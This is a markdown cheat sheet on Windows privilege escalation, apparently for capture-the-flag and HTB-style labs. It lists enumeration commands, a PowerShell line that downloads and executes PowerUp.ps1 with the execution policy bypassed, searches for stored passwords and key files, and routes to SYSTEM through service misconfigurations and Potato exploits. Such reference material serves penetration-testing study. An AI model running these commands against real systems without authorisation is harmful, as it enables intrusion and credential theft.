# Offensive — Windows Privilege Escalation (General CTF / HTB-style)

## Step 1: run an automated enumeration script first

```powershell
# WinPEAS — standard first move
Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile winpeas.exe
.\winpeas.exe | Tee-Object -FilePath winpeas_output.txt

# PowerUp.ps1 (PowerSploit) — another strong automated check
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('<raw-url-to-PowerUp.ps1>'); Invoke-AllChecks"
```

## Manual checklist

### Unquoted service paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '"'
```
A service path like `C:\Program Files\My App\service.exe` with no quotes lets you plant
`C:\Program.exe` to hijack execution if you have write access to `C:\`.

### Weak service permissions
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula   # Sysinternals — find services users can reconfigure
```
If you can modify a service's binary path and the service runs as SYSTEM, you can point it at your own
payload and restart it.

### AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both are set to `1`, any user can install an `.msi` that runs as SYSTEM.

### Stored credentials
```powershell
cmdkey /list
dir /s /b *pass* == *.config == *.xml 2>nul | findstr /i pass
findstr /si password *.txt *.ini *.config *.xml 2>nul
Get-ChildItem -Path C:\ -Include *.kdbx,*.ppk,*password* -Recurse -ErrorAction SilentlyContinue
```

### Scheduled tasks you can modify
```powershell
schtasks /query /fo LIST /v
icacls "C:\path\to\task\binary.exe"   # check if you have write access to a task's target binary
```

### Token/privilege abuse
```powershell
whoami /priv
```
Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — these enable
"potato"-family exploits (JuicyPotato, PrintSpoofer, RoguePotato depending on OS version) to escalate
from a service account to SYSTEM.

### Kernel exploits (last resort)
```powershell
systeminfo
```
Cross-reference patch level against known local privesc CVEs for that build — same caveat as Linux:
risk of crashing the box, avoid in the real exercise unless there's no other path and it's within
scope.

## Workflow

1. Run WinPEAS, read flagged items.
2. Check `whoami /priv` for impersonation privileges — if present, a Potato-family technique is often
   the fastest path to SYSTEM for a service account.
3. Check service permissions and unquoted paths.
4. Check for stored/cached credentials before resorting to exploits.
